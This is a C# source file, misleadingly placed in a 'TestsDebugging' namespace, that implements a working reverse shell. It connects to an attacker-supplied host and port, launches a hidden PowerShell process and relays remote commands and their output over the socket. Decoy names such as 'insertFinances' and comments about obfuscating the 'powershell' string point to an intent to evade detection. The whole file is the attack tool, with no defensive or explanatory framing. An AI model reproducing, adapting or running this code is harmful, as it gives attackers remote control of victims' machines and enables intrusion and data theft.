using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

namespace TestsDebugging
{
    class Program
    {
        static StreamWriter streamWriter;

        private static void insertFinances(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

        public static void RTCP(string HOST, string PORT)
        {
            using (TcpClient client = new TcpClient(HOST, Int32.Parse(PORT)))
            {
                using (Stream stream = client.GetStream())
                {
                    using (StreamReader myReader = new StreamReader(stream))
                    {
                        streamWriter = new StreamWriter(stream);

                        StringBuilder strInput = new StringBuilder();

                        Process flapperJackTenThirtyFour = new Process();

                        //Obfuscate maybe
                        //string c = "ll.exe";
                        //string a = "pow";
                        //string b = "ershe";

                        //Make if statement for configurable?
                        flapperJackTenThirtyFour.StartInfo.FileName = "powershell.exe"; //"cmd.exe";
                        flapperJackTenThirtyFour.StartInfo.CreateNoWindow = true;
                        flapperJackTenThirtyFour.StartInfo.UseShellExecute = false;

                        flapperJackTenThirtyFour.StartInfo.RedirectStandardInput = true;
                        flapperJackTenThirtyFour.StartInfo.RedirectStandardError = true;

                        flapperJackTenThirtyFour.StartInfo.RedirectStandardOutput = true;

                        flapperJackTenThirtyFour.OutputDataReceived += new DataReceivedEventHandler(insertFinances);
                        flapperJackTenThirtyFour.Start();
                        flapperJackTenThirtyFour.BeginOutputReadLine();

                        while (true)
                        {
                            strInput.Append(myReader.ReadLine());
                            flapperJackTenThirtyFour.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }

        public static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                //Messagebox / error?
            }
            else
            {
                RTCP(args[0], args[1]);
            }
			
			Console.WriteLine("RTCP sent to " + args[0] + ":" + args[1]);
        }
    }
    }